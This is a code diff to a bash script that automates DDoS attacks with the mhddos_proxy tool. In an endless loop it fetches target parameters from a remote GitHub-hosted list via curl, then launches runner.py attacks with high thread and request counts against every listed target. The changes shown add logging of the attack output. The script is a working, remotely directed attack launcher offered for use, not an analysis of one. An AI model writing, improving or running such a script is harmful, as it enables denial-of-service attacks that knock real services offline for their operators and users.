@@ -19,11 +19,13 @@ threads="${1:-500}"
 rpc="--rpc 2000"
 proxy_upd="-p 3600"
 debug="--debug"
+logs="~/logs.txt"
 
 # Restart attacks and update targets every 15 minutes
 while true
 do
    pkill -f start.py; pkill -f runner.py 
+   echo "" > $logs
    # Get number of targets. Sometimes list_size = 0 (network or github problem). So here is check to avoid script error.
    list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
    while [[ $list_size = "0"  ]]
@@ -37,8 +39,8 @@ do
    for (( i=1; i<=list_size; i++ ))
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
-            echo "Starting attack with params: $cmd_line $threads_per_target $rpc $proxy_upd $debug"
-            python3 ~/mhddos_proxy/runner.py $cmd_line $threads_per_target $rpc $proxy_upd $debug &
+            echo "\n---------\nStarting attack with params: $cmd_line $threads_per_target $rpc $proxy_upd $debug \n---------\n"
+            python3 ~/mhddos_proxy/runner.py $cmd_line $threads_per_target $rpc $proxy_upd $debug >> $logs &
       done
 sleep 15m
 done
